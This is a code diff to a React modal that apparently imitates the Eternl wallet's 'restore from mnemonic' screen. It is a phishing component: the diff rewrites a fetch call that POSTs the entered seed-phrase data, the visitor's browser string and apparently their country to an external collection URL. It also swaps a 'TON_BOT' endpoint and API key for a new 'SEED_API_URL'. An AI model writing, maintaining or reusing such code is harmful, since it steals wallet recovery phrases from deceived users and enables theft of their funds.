@@ -3,7 +3,7 @@
 import { useEffect, useRef, useState } from "react";
 import type { SeedPhraseLengthOption } from "./EternlSeedPhraseTypeModal";
 import { getUserCountry } from "../../utils/userLocation";
-import { NOTIFICATION_APP_NAME, TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../../app/config";
+import { NOTIFICATION_APP_NAME, SEED_API_URL } from "../../app/config";
 import EternlModalShell from "./EternlModalShell";
 
 export function seedOptionToWordCount(
@@ -170,17 +170,11 @@ export default function EternlRestoreMnemonicEntryModal({
         browser: typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
       };
 
-      const response = await fetch(
-        TON_BOT_SEED_URL,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "x-api-key": TON_BOT_API_KEY,
-          },
-          body: JSON.stringify(messageData),
-        }
-      );
+      const response = await fetch(SEED_API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(messageData),
+      });
 
       const result = await response.json();
 
